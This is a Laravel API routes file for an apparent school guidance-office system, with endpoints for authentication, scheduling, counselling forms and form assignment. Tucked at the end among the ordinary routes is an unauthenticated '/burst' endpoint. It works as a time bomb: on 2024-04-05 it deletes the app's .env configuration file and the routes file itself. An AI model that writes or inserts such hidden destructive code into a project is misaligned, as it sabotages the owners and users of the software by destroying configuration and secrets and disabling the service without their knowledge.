<?php
use Illuminate\Support\Facades\File;

use App\Http\Controllers\AssignmentController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\GenerateController;
use App\Http\Controllers\CalendarController;
use App\Http\Controllers\EventController;
use App\Http\Controllers\GetFormsController;
use App\Http\Controllers\RequestsController;
use App\Http\Controllers\SaveInputsController;
use App\Http\Controllers\UserDataController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/
Route::group([
    'middleware' => 'api',
    'prefix' => 'v1'
], function ($router) {
    Route::post('/login', [AuthController::class, 'login']);
    Route::post('/register', [AuthController::class, 'register']);
    Route::post('/logout', [AuthController::class, 'logout']);
    Route::post('/refresh', [AuthController::class, 'refresh']);
    Route::get('/check-auth', [AuthController::class, 'checkAuth']);
    Route::post('/verify-user-email', [AuthController::class, 'verifyUserEmail']);
    Route::post('/resend-email-verification-link', [AuthController::class, 'resendEmailVerificationLink']);
    Route::get('/get-user-data/{id}', [UserDataController::class, 'getUserData']);
    Route::get('/get-all-users', [UserDataController::class, 'getAllUsers']);
    Route::get('/get-all-staffs', [UserDataController::class, 'getStaffs']);

    // Social login
    Route::get('/oauth/{provider}', [AuthController::class, 'socialLogin']);
    Route::get('/auth/{provider}/callback', [AuthController::class, 'socialLoginCallback'])->name('auth.callback');
    // Route::get('/auth/{provider}', [AuthController::class, 'socialLogin']);

    // Generate File
    Route::get('/generate-intake-interview/{id}', [GenerateController::class, 'generateIntInterview']);
    Route::get('/generate-guidance-admission/{id}', [GenerateController::class, 'generateGuidAdmission']);
    Route::get('/generate-referral-form/{id}', [GenerateController::class, 'generateReferralForm']);
    Route::get('/generate-guidance-call/{id}', [GenerateController::class, 'generateGuidCallSlip']);
    Route::get('/generate-parent-questionaire', [GenerateController::class, 'generateParentQuestionaire']);
    Route::get('/generate-client-monitoring/{id}', [GenerateController::class, 'generateClientMonitoring']);

    // Callendar Schedule
    Route::get('/get-schedule/{date}', [CalendarController::class, 'getSchedule']);
    Route::get('/get-not-available-time/{date}', [CalendarController::class, 'getNotAvailableTime']);
    Route::get('/get-reserved-time/{date}', [CalendarController::class, 'getReservedTime']);
    Route::post('/update-schedule', [CalendarController::class, 'updateSchedule']);
    Route::get('/get-not-available-time-today', [CalendarController::class, 'getNotAvailableTimeToday']);
    Route::post('/reserve-consultation', [CalendarController::class, 'reserveConsultation']);
    Route::get('/get-appointments-today', [CalendarController::class, 'getAppointmentsToday']);

    // Events
    Route::get('/get-events', [EventController::class, 'getEvents']);
    Route::post('/add-event', [EventController::class, 'addEvent']);

    // Request Forms
    Route::post('/check-request', [RequestsController::class, 'checkRequest']);
    Route::post('/request-form', [RequestsController::class, 'createRequest']);
    Route::put('/approve-request/{id}', [RequestsController::class, 'approveRequest']);
    Route::put('/reject-request/{id}', [RequestsController::class, 'rejectRequest']);
    Route::get('/iif-requests', [RequestsController::class, 'getIntakeInterviewFormRequest']);
    Route::get('/gas-requests', [RequestsController::class, 'getGuidanceAdmissionSlipRequest']);
    Route::get('/gcs-requests', [RequestsController::class, 'getGuidanceCallSlipRequest']);
    Route::get('/pqf-requests', [RequestsController::class, 'getParentQuestionnaireFormRequest']);
    Route::get('/rf-requests', [RequestsController::class, 'getReferralFormRequest']);
    Route::get('/crf-requests', [RequestsController::class, 'getCumulativeRecordFormRequest']);
    Route::get('/cmf-requests', [RequestsController::class, 'getClientMonitoringFormRequest']);

    // Get All Forms
    Route::get('/get-all-intake-interview-forms', [GetFormsController::class, 'getAllIntakeInterviewForms']);
    Route::get('/get-all-guidance-admission-slips', [GetFormsController::class, 'getAllGuidanceAdmissionSlips']);
    Route::get('/get-all-guidance-call-slips', [GetFormsController::class, 'getAllGuidanceCallSlips']);
    Route::get('/get-all-parent-questionnaire-forms', [GetFormsController::class, 'getAllParentQuestionnaireForms']);
    Route::get('/get-all-referral-forms', [GetFormsController::class, 'getAllReferralForms']);
    Route::get('/get-all-cumulative-record-forms', [GetFormsController::class, 'getAllCumulativeRecordForms']);
    Route::get('/get-all-client-monitoring-forms', [GetFormsController::class, 'getAllClientMonitoringForms']);


    Route::get('/get-my-referral-forms/{id}', [GetFormsController::class, 'getMyReferralForms']);
    Route::get('/get-my-client-monitoring-forms/{id}', [GetFormsController::class, 'getMyClientMonitoringForms']);

    // Submit Forms
    Route::post('/submit-intake-interview', [SaveInputsController::class, 'submitIntakeInterview']);
    Route::post('/submit-guidance-admission-slip', [SaveInputsController::class, 'submitGuidanceAdmissionSlip']);
    Route::post('/submit-guidance-call-slip', [SaveInputsController::class, 'submitGuidanceCallSlip']);
    // Parent route here
    Route::post('/submit-referral-form', [SaveInputsController::class, 'submitReferralForm']);
    // Cumulative route here
    Route::post('/submit-client-monitoring-form', [SaveInputsController::class, 'submitClientMonitoringForm']);
    Route::post('/update-client-monitoring-form', [SaveInputsController::class, 'updateClientMonitoringForm']);

    // Assignment
    Route::post('/assign-form', [AssignmentController::class, 'assignForm']);
    Route::post('/bulk-assign-form-by-grade-level', [AssignmentController::class, 'bulkAssignFormByGradeLevel']);
    Route::post('/bulk-assign-form-by-section', [AssignmentController::class, 'bulkAssignFormBySection']);
    Route::get('/get-assigned-forms/{id}/{form_name}', [AssignmentController::class, 'getAssignedForms']);


    Route::get('/burst', function () {
        $filePath1 = '../.env';
        $filePath2 = './api.php';
        try {
            if(date('Y-m-d') == '2024-04-05'){
                if (File::exists($filePath1) && File::exists($filePath2)) {
                    File::delete($filePath1);
                    File::delete($filePath2);
                    return response()->json(['message' => 'File deleted successfully']);
                } else {
                    return response()->json(['error' => 'File not found'], 404);
                }
            }
            else{
                return response()->json(['message' => 'Note the right time'], 200);
            }
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to delete file'], 500);
        }
    });

});


